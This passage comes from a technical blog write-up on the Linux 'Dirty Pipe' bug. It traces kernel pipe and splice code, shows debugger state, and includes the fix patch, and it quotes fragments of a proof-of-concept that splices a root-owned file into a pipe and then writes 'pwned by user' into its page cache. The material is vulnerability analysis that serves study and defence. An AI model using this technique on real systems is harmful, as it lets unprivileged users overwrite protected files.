+	<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe <span style=color:#f92672>=</span> filp<span style=color:#f92672>-&gt;</span>private_data;
+	<span style=color:#66d9ef>bool</span> was_full, wake_next_reader <span style=color:#f92672>=</span> false;
+	ssize_t ret;
+...
+	ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+	__pipe_lock(pipe);
+
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * We only wake up writers if the pipe was full when we started
+</span><span style=color:#75715e>	 * reading in order to avoid unnecessary wakeups.
+</span><span style=color:#75715e>	 *
+</span><span style=color:#75715e>	 * But when we do wake up writers, we do so using a sync wakeup
+</span><span style=color:#75715e>	 * (WF_SYNC), because we want them to get going and generate more
+</span><span style=color:#75715e>	 * data for us.
+</span><span style=color:#75715e>	 */</span>
+	was_full <span style=color:#f92672>=</span> pipe_full(pipe<span style=color:#f92672>-&gt;</span>head, pipe<span style=color:#f92672>-&gt;</span>tail, pipe<span style=color:#f92672>-&gt;</span>max_usage);
+	<span style=color:#66d9ef>for</span> (;;) {
+		<span style=color:#75715e>/* Read -&gt;head with a barrier vs post_one_notification() */</span>
+		<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> head <span style=color:#f92672>=</span> smp_load_acquire(<span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>head);
+		<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> tail <span style=color:#f92672>=</span> pipe<span style=color:#f92672>-&gt;</span>tail;
+		<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> mask <span style=color:#f92672>=</span> pipe<span style=color:#f92672>-&gt;</span>ring_size <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
+...
+		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pipe_empty(head, tail)) {
+			<span style=color:#66d9ef>struct</span> pipe_buffer <span style=color:#f92672>*</span>buf <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>bufs[tail <span style=color:#f92672>&amp;</span> mask];
+			size_t chars <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>len;
+			size_t written;
+			<span style=color:#66d9ef>int</span> error;
+
+			<span style=color:#66d9ef>if</span> (chars <span style=color:#f92672>&gt;</span> total_len) {
+...
+				chars <span style=color:#f92672>=</span> total_len;
+			}
+...
+			written <span style=color:#f92672>=</span> copy_page_to_iter(buf<span style=color:#f92672>-&gt;</span>page, buf<span style=color:#f92672>-&gt;</span>offset, chars, to);
+...
+			ret <span style=color:#f92672>+=</span> chars;
+			buf<span style=color:#f92672>-&gt;</span>offset <span style=color:#f92672>+=</span> chars;
+			buf<span style=color:#f92672>-&gt;</span>len <span style=color:#f92672>-=</span> chars;
+...
+			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>buf<span style=color:#f92672>-&gt;</span>len) {
+				pipe_buf_release(pipe, buf);
+...
+				tail<span style=color:#f92672>++</span>;
+				pipe<span style=color:#f92672>-&gt;</span>tail <span style=color:#f92672>=</span> tail;
+...
+			}
+			total_len <span style=color:#f92672>-=</span> chars;
+			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>total_len)
+				<span style=color:#66d9ef>break</span>;	<span style=color:#75715e>/* common path: read succeeded */</span>
+			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pipe_empty(head, tail))	<span style=color:#75715e>/* More to do? */</span>
+				<span style=color:#66d9ef>continue</span>;
+		}
+
+		<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pipe<span style=color:#f92672>-&gt;</span>writers)
+			<span style=color:#66d9ef>break</span>;
+		<span style=color:#66d9ef>if</span> (ret)
+			<span style=color:#66d9ef>break</span>;
+		<span style=color:#66d9ef>if</span> (filp<span style=color:#f92672>-&gt;</span>f_flags <span style=color:#f92672>&amp;</span> O_NONBLOCK) {
+			ret <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EAGAIN;
+			<span style=color:#66d9ef>break</span>;
+		}
+		...
+	}
+...
+	<span style=color:#66d9ef>if</span> (ret <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>)
+		file_accessed(filp);
+	<span style=color:#66d9ef>return</span> ret;
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L231><code>⬀ go to source code</code></a></p>
+<p>If the pipe is non-empty, the data is taken from the <code>tail</code>-indexed <code>pipe_buffer</code> (in <code>bufs</code>). In case, a buffer is emptied during a read, the <code>release</code> function pointer of the <code>ops</code> field of the <code>pipe_buffer</code> is executed. For a <code>pipe_buffer</code> that was initialized by an earlier <code>write()</code>, the <code>ops</code> field is a pointer to the <code>struct pipe_buf_operations anon_pipe_buf_ops</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> pipe_buf_operations anon_pipe_buf_ops <span style=color:#f92672>=</span> {
+	.release	<span style=color:#f92672>=</span> anon_pipe_buf_release,
+	.try_steal	<span style=color:#f92672>=</span> anon_pipe_buf_try_steal,
+	.get		<span style=color:#f92672>=</span> generic_pipe_buf_get,
+};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L214><code>⬀ go to source code</code></a></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/**
+</span><span style=color:#75715e> * pipe_buf_release - put a reference to a pipe_buffer
+</span><span style=color:#75715e> * @pipe:	the pipe that the buffer belongs to
+</span><span style=color:#75715e> * @buf:	the buffer to put a reference to
+</span><span style=color:#75715e> */</span>
+<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>inline</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>pipe_buf_release</span>(<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe,
+				    <span style=color:#66d9ef>struct</span> pipe_buffer <span style=color:#f92672>*</span>buf)
+{
+	<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> pipe_buf_operations <span style=color:#f92672>*</span>ops <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>ops;
+
+	buf<span style=color:#f92672>-&gt;</span>ops <span style=color:#f92672>=</span> NULL;
+	ops<span style=color:#f92672>-&gt;</span>release(pipe, buf);
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L197><code>⬀ go to source code</code></a></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>anon_pipe_buf_release</span>(<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe,
+				  <span style=color:#66d9ef>struct</span> pipe_buffer <span style=color:#f92672>*</span>buf)
+{
+	<span style=color:#66d9ef>struct</span> page <span style=color:#f92672>*</span>page <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>page;
+
+	<span style=color:#75715e>/*
+</span><span style=color:#75715e>	 * If nobody else uses this page, and we don&#39;t already have a
+</span><span style=color:#75715e>	 * temporary page, let&#39;s keep track of it as a one-deep
+</span><span style=color:#75715e>	 * allocation cache. (Otherwise just release our reference to it)
+</span><span style=color:#75715e>	 */</span>
+	<span style=color:#66d9ef>if</span> (page_count(page) <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>pipe<span style=color:#f92672>-&gt;</span>tmp_page)
+		pipe<span style=color:#f92672>-&gt;</span>tmp_page <span style=color:#f92672>=</span> page;
+	<span style=color:#66d9ef>else</span>
+		put_page(page);
+}
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L125><code>⬀ go to source code</code></a></p>
+<p>Thus, <code>anon_pipe_buf_release()</code> is executed, which calls <code>put_page()</code> to release our reference to the page. Note that while the <code>ops</code> pointer is set to NULL to signal that be buffer has been released, the <code>page</code> and <code>flags</code> fields of the <code>pipe_buffer</code> are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are &ldquo;uninitialized&rdquo;. We can confirm this by printing the pipe structures after the last read.</p>
+<pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
+&gt; 'head': 1
+&gt; 'tail': 1
+&gt; 'ring_size': 1
+&gt; 'bufs': 0xffff888101f8a180
+
+struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': 0xffffea00040e3bc0
+&gt; 'offset': 4096
+&gt; 'len': 0
+&gt; 'ops': NULL
+&gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
+</code></pre><h3 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>For us, the key takeaways are:</p>
+<ol>
+<li>Writes to a pipe can append to the <code>page</code> of a <code>pipe_buffer</code> if its <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag is set.</li>
+<li>This flag is set by default for buffers that are initialized by writes.</li>
+<li>Emptying a pipe with a <code>read()</code> leaves the <code>pipe_buffer</code>s' flags unmodified.</li>
+</ol>
+<p>However, <code>write</code>s to a pipe are not the only way fill it!</p>
+<h2 id=pipes-splicing>Pipes (splicing)<a href=#pipes-splicing class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>Besides reading and writing, the Linux programming interface also offers the <code>splice</code> syscall for moving data from or to a pipe. This is what our PoC does next.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>    pause_for_inspection(<span style=color:#e6db74>&#34;About to splice() file to pipe&#34;</span>);
+    <span style=color:#66d9ef>if</span> (splice(tfd, <span style=color:#ae81ff>0</span>, pipefds[<span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+        exit(<span style=color:#ae81ff>1</span>);
+    }
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L76><code>⬀ go to source code</code></a>
+Since this syscall may not be as well-known as the others, let&rsquo;s briefly discuss it from a user&rsquo;s perspective.</p>
+<h3 id=the-splice-system-call-user-land>The <code>splice</code> System Call (user land)<a href=#the-splice-system-call-user-land class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<pre tabindex=0><code>SPLICE(2)                       Linux Programmer's Manual                      SPLICE(2)
+
+NAME
+       splice - splice data to/from a pipe
+
+SYNOPSIS
+       #define _GNU_SOURCE         /* See feature_test_macros(7) */
+       #include &lt;fcntl.h&gt;
+
+       ssize_t splice(int fd_in, off64_t *off_in, int fd_out,
+                      off64_t *off_out, size_t len, unsigned int flags);
+
+DESCRIPTION
+       splice()  moves  data between two file descriptors without copying between kernel
+       address space and user address space.  It transfers up to len bytes of data  from
+       the  file  descriptor  fd_in to the file descriptor fd_out, where one of the file
+       descriptors must refer to a pipe.
+
+       The following semantics apply for fd_in and off_in:
+    
+       *  If fd_in refers to a pipe, then off_in must be NULL.
+    
+       *  If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from
+          fd_in starting from the file offset, and the file offset is adjusted appropri‐
+          ately.
+    
+       *  If fd_in does not refer to a pipe and off_in is not  NULL,  then  off_in  must
+          point to a buffer which specifies the starting offset from which bytes will be
+          read from fd_in; in this case, the file offset of fd_in is not changed.
+    
+       Analogous statements apply for fd_out and off_out.
+</code></pre><p>As mentioned above, a process can obtain a file descriptor using the <code>sys_open</code> system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could <code>read()</code> the data from the file into a buffer in its memory (or <code>mmap()</code> the file) and then <code>write()</code> it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the <code>sys_splice</code> system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure.
+One of <code>fd_in</code> or <code>fd_out</code> must be a pipe. The other <code>fd_xxx</code> can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann&rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out <a href=https://web.archive.org/web/20130521163124/http://kerneltrap.org/node/6505>this</a> to read how Linus Torvalds himself explains the <code>splice</code> system call 8-)</p>
+<h3 id=the-splice-system-call-implementation>The <code>splice</code> System Call (Implementation)<a href=#the-splice-system-call-implementation class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>The <em>very</em> high level idea of the <code>splice</code> implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory.
+<img src=https://i.imgur.com/nHzmRxN.png alt></p>
+<p>To see that this figure is correct, we start from the system call&rsquo;s entry point <code>SYSCALL_DEFINE6(splice,...)</code>, and first arrive at the function <code>__do_splice()</code> that is responsible for copying the offset values from and to user space. The called function <code>do_splice()</code> determines if we want to splice to, from or between pipes. In the first case the function</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>do_splice_to</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>in, loff_t <span style=color:#f92672>*</span>ppos,
+			 <span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe, size_t len,
+			 <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> flags);
+</code></pre></div><p>is called, which executes</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>in<span style=color:#f92672>-&gt;</span>f_op<span style=color:#f92672>-&gt;</span>splice_read(in, ppos, pipe, len, flags);
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/splice.c#L773><code>⬀ go to source code</code></a></p>
+<p>From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the <code>ext2</code> file system, the correct implementation is found in <code>ext2_file_operations</code>. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path&mldr; we&rsquo;ll meet again later ;) If you interested in this nice abstraction check out the <a href=https://www.kernel.org/doc/html/latest/filesystems/vfs.html>Linux Virtual File System</a> documentation.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> file_operations ext2_file_operations <span style=color:#f92672>=</span> {
+...
+	.read_iter	<span style=color:#f92672>=</span> ext2_file_read_iter,
+...
+	.splice_read	<span style=color:#f92672>=</span> generic_file_splice_read,
+...
+};
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/ext2/file.c#L182><code>⬀ go to source code</code></a></p>
+<p>Calling <code>generic_file_splice_read()</code> (eventually&mldr;) leads us to <code>filemap_read()</code>. Notice that at this point we switch from the file system <code>fs/</code> into the <a href=https://www.kernel.org/doc/html/latest/core-api/mm-api.html>memory management</a> <code>mm/</code> subsystem of the kernel.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/**
+</span><span style=color:#75715e> * filemap_read - Read data from the page cache.
+</span><span style=color:#75715e> * @iocb: The iocb to read.
+</span><span style=color:#75715e> * @iter: Destination for the data.
+</span><span style=color:#75715e> * @already_read: Number of bytes already read by the caller.
+</span><span style=color:#75715e> *
+</span><span style=color:#75715e> * Copies data from the page cache.  If the data is not currently present,
+</span><span style=color:#75715e> * uses the readahead and readpage address_space operations to fetch it.
+</span><span style=color:#75715e> *
+</span><span style=color:#75715e> * Return: Total number of bytes copied, including those already read by
+</span><span style=color:#75715e> * the caller.  If an error happens before any bytes are copied, returns
+</span><span style=color:#75715e> * a negative error number.
+</span><span style=color:#75715e> */</span>
+ssize_t <span style=color:#a6e22e>filemap_read</span>(<span style=color:#66d9ef>struct</span> kiocb <span style=color:#f92672>*</span>iocb, <span style=color:#66d9ef>struct</span> iov_iter <span style=color:#f92672>*</span>iter,
+		ssize_t already_read)
+{
+	<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filp <span style=color:#f92672>=</span> iocb<span style=color:#f92672>-&gt;</span>ki_filp;
+	<span style=color:#66d9ef>struct</span> file_ra_state <span style=color:#f92672>*</span>ra <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>filp<span style=color:#f92672>-&gt;</span>f_ra;
+	<span style=color:#66d9ef>struct</span> address_space <span style=color:#f92672>*</span>mapping <span style=color:#f92672>=</span> filp<span style=color:#f92672>-&gt;</span>f_mapping;
+	<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inode <span style=color:#f92672>=</span> mapping<span style=color:#f92672>-&gt;</span>host;
+	<span style=color:#66d9ef>struct</span> folio_batch fbatch;
+...
+        folio_batch_init(<span style=color:#f92672>&amp;</span>fbatch);
+...
+    <span style=color:#66d9ef>do</span> {
+...
+		error <span style=color:#f92672>=</span> filemap_get_pages(iocb, iter, <span style=color:#f92672>&amp;</span>fbatch);
+...
+		<span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> folio_batch_count(<span style=color:#f92672>&amp;</span>fbatch); i<span style=color:#f92672>++</span>) {
+			<span style=color:#66d9ef>struct</span> folio <span style=color:#f92672>*</span>folio <span style=color:#f92672>=</span> fbatch.folios[i];
+			size_t fsize <span style=color:#f92672>=</span> folio_size(folio);
+			size_t offset <span style=color:#f92672>=</span> iocb<span style=color:#f92672>-&gt;</span>ki_pos <span style=color:#f92672>&amp;</span> (fsize <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
+			size_t bytes <span style=color:#f92672>=</span> min_t(loff_t, end_offset <span style=color:#f92672>-</span> iocb<span style=color:#f92672>-&gt;</span>ki_pos,
+					     fsize <span style=color:#f92672>-</span> offset);
+			size_t copied;
+...
+			copied <span style=color:#f92672>=</span> copy_folio_to_iter(folio, offset, bytes, iter);
+            
+			already_read <span style=color:#f92672>+=</span> copied;
+			iocb<span style=color:#f92672>-&gt;</span>ki_pos <span style=color:#f92672>+=</span> copied;
+			ra<span style=color:#f92672>-&gt;</span>prev_pos <span style=color:#f92672>=</span> iocb<span style=color:#f92672>-&gt;</span>ki_pos;
+...
+		}
+...
+		folio_batch_init(<span style=color:#f92672>&amp;</span>fbatch);
+	} <span style=color:#66d9ef>while</span> (iov_iter_count(iter) <span style=color:#f92672>&amp;&amp;</span> iocb<span style=color:#f92672>-&gt;</span>ki_pos <span style=color:#f92672>&lt;</span> isize <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>error);
+...
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/mm/filemap.c#L2645><code>⬀ go to source code</code></a></p>
+<p>In this function the actual copying (again no real byte-for-byte copy&mldr; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to <code>copy_folio_to_iter()</code>. Note that a <a href=https://lwn.net/Articles/849538/>folio</a> is not quite the same as a page, but for our purposes this doesn&rsquo;t matter.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>copied <span style=color:#f92672>=</span> copy_folio_to_iter(folio, offset, bytes, iter);
+</code></pre></div><p>Besides, however, that if we look closer at the implementation of this operation in <code>copy_page_to_iter_pipe()</code>, we notice that the data is not actually copied at all!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> size_t <span style=color:#a6e22e>copy_page_to_iter_pipe</span>(<span style=color:#66d9ef>struct</span> page <span style=color:#f92672>*</span>page, size_t offset, size_t bytes,
+			 <span style=color:#66d9ef>struct</span> iov_iter <span style=color:#f92672>*</span>i)
+{
+...
+<span style=color:#66d9ef>struct</span> pipe_inode_info <span style=color:#f92672>*</span>pipe <span style=color:#f92672>=</span> i<span style=color:#f92672>-&gt;</span>pipe;
+<span style=color:#66d9ef>struct</span> pipe_buffer <span style=color:#f92672>*</span>buf;
+<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> p_mask <span style=color:#f92672>=</span> pipe<span style=color:#f92672>-&gt;</span>ring_size <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
+<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i_head <span style=color:#f92672>=</span> i<span style=color:#f92672>-&gt;</span>head;
+size_t off;
+...
+off <span style=color:#f92672>=</span> i<span style=color:#f92672>-&gt;</span>iov_offset;
+buf <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>bufs[i_head <span style=color:#f92672>&amp;</span> p_mask];
+<span style=color:#66d9ef>if</span> (off) {
+	<span style=color:#66d9ef>if</span> (offset <span style=color:#f92672>==</span> off <span style=color:#f92672>&amp;&amp;</span> buf<span style=color:#f92672>-&gt;</span>page <span style=color:#f92672>==</span> page) {
+	    <span style=color:#75715e>/* merge with the last one */</span>
+		buf<span style=color:#f92672>-&gt;</span>len <span style=color:#f92672>+=</span> bytes;
+		i<span style=color:#f92672>-&gt;</span>iov_offset <span style=color:#f92672>+=</span> bytes;
+		<span style=color:#66d9ef>goto</span> out;
+	}
+	i_head<span style=color:#f92672>++</span>;
+	buf <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>pipe<span style=color:#f92672>-&gt;</span>bufs[i_head <span style=color:#f92672>&amp;</span> p_mask];
+}
+...
+	buf<span style=color:#f92672>-&gt;</span>ops <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>page_cache_pipe_buf_ops;
+
+	get_page(page);
+	buf<span style=color:#f92672>-&gt;</span>page <span style=color:#f92672>=</span> page;
+	buf<span style=color:#f92672>-&gt;</span>offset <span style=color:#f92672>=</span> offset;
+	buf<span style=color:#f92672>-&gt;</span>len <span style=color:#f92672>=</span> bytes;
+...
+</code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/lib/iov_iter.c#L382><code>⬀ go to source code</code></a></p>
+<p>We first try to &lsquo;append&rsquo; the current copy operation to an earlier one by increasing the <code>length</code> of the <code>pipe_buffer</code> at <code>head</code>. In case this is not possible, we simply advance the <code>head</code> and put a <em>reference to</em> the page we copy into its <code>page</code> field while making sure that <code>offset</code> and <code>length</code> are set correctly. Indeed, the idea behind the efficiency of <code>sys_splice</code> is to implement it as a <em>zero-copy</em> operation, where pointers and reference counts are used instead of actually duplicating the data.</p>
+<p>Clearly this code potentially reuses the <code>pipe_buffer</code>s (<code>buf = &pipe->bufs[i_head & p_mask]</code>), and thus all fields <em>must</em> be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the <code>flags</code> is missing. As pointed out by Max Kellermann, it was missing since the <a href=https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b>commit</a> that introduced this function.</p>
+<h3 id=debugger-1>Debugger<a href=#debugger-1 class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,</p>
+<pre tabindex=0><code>struct file at 0xffff8881045b0800
+&gt; 'f_mapping': 0xffff8881017d9460
+&gt; filename: target_file
+
+struct address_space at 0xffff8881017d9460
+&gt; 'a_ops': 0xffffffff82226ce0 &lt;ext4_aops&gt;
+&gt; 'i_pages.xa_head' : 0xffffea0004156880
+
+struct page at 0xffffea0004156880
+&gt; virtual: 0xffff8881055a2000
+&gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre><p>and this is the state of the pipe after splicing</p>
+<pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
+&gt; 'head': 2
+&gt; 'tail': 1
+&gt; 'ring_size': 1
+&gt; 'bufs': 0xffff888101f8a180
+
+struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': 0xffffea0004156880                                        &lt;- same page as before
+&gt; 'offset': 0
+&gt; 'len': 5
+&gt; 'ops': 0xffffffff8221cee0 &lt;page_cache_pipe_buf_ops&gt;
+&gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE                                  &lt;- flag still set... oopsie :)
+</code></pre><p>The data pointer in the <code>struct address_space</code> (which represents the page cache&rsquo;s view on the <code>target_file</code>) and the <code>pipe_buffer</code> at <code>head</code> are equal, while the offset and length reflect what our PoC specified in its call to <code>splice</code>. Note that we are reusing the buffer we emptied earlier, re-initializing all fields <em>but</em> the flags.</p>
+<h2 id=whats-the-actual-problem>What&rsquo;s the Actual Problem?<a href=#whats-the-actual-problem class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>At this point the problem becomes evident. With <strong>anonymous</strong> pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag. With the <strong>file-backed buffers</strong>, created by splicing, this should not be allowed by the kernel since those pages are &ldquo;owned&rdquo; by the page cache and not by the pipe.</p>
+<p>Thus, when we <code>splice()</code> the data from a file into a pipe we would have to set <code>buf->flags = 0</code> to indicate that it is not okay to append data to an already existing - not fully written - page (<code>buf->page</code>) since this page belongs to the page cache (the file). When we <code>pipe_write()</code> (or in our program just <code>write()</code>) again we write into the page cache&rsquo;s page because the check <code>buf->flags & PIPE_BUF_FLAG_CAN_MERGE</code> is <code>true</code> (see <code>pipe_write</code> above if you forgot about that part).</p>
+<p>So the main problem is that we start with an anonymous pipe that will then be &ldquo;turned into&rdquo; a file-backed pipe (not the whole pipe but some buffers) by the <code>splice()</code> but the pipe does not get this information since <code>buf->flags</code> is not set to <code>0</code> and thus the merging is still allowed.</p>
+<p>The <a href=https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903>patch</a> is simply adding the missing initialization.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/lib/iov_iter.c b/lib/iov_iter.c
+index b0e0acdf96c15e..6dd5330f7a9957 100644
+<span style=color:#f92672>--- a/lib/iov_iter.c
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/lib/iov_iter.c
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
+</span><span style=color:#75715e></span>return 0;
+    
+    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
+<span style=color:#a6e22e>+   buf-&gt;flags = 0;
+</span><span style=color:#a6e22e></span>    get_page(page);
+    buf-&gt;page = page;
+    buf-&gt;offset = offset;
+</code></pre></div><p>As we can see above, our PoC arranged for the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>pause_for_inspection(<span style=color:#e6db74>&#34;About to write() into page cache&#34;</span>);
+<span style=color:#66d9ef>if</span> (write(pipefds[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;pwned by user&#34;</span>, <span style=color:#ae81ff>13</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>13</span>) {
+    exit(<span style=color:#ae81ff>1</span>);
+}
+</code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L81><code>⬀ go to source code</code></a></p>
+<p>Back in the debugger, we can see that the final invocation of <code>pipe_write()</code> appends to the partially filled <code>pipe_buffer</code> that is backed by the page cache.</p>
+<pre tabindex=0><code>struct address_space at 0xffff8881017d9460
+&gt; 'a_ops': 0xffffffff82226ce0 &lt;ext4_aops&gt;
+&gt; 'i_pages.xa_head' : 0xffffea0004156880
+
+struct pipe_inode_info at 0xffff8881044aec00
+&gt; 'head': 2
+&gt; 'tail': 1
+&gt; 'ring_size': 1
+&gt; 'bufs': 0xffff888101f8a180
+
+struct pipe_buffer at 0xffff888101f8a180
+&gt; 'page': 0xffffea0004156880
+&gt; 'offset': 0
+&gt; 'len': 18
+&gt; 'ops': 0xffffffff8221cee0 &lt;page_cache_pipe_buf_ops&gt;
+&gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
+
+struct page at 0xffffea0004156880
+&gt; virtual: 0xffff8881055a2000
